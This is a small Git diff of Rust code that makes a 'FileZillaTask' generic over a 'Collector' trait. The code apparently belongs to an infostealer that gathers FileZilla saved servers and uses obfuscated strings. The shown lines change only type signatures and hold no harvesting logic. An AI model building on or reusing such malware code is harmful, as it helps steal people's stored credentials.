@@ -2,7 +2,6 @@ use alloc::borrow::ToOwned;
 use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
-use collector::atomic::AtomicCollector;
 use collector::{Collector, Software};
 use obfstr::obfstr as s;
 use tasks::Task;
@@ -13,8 +12,8 @@ use windows::Data::Xml::Dom::XmlDocument;
 
 pub(super) struct FileZillaTask;
 
-impl Task for FileZillaTask {
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+impl<C: Collector> Task<C> for FileZillaTask {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let servers = collect_servers();
 
         if servers.is_empty() {
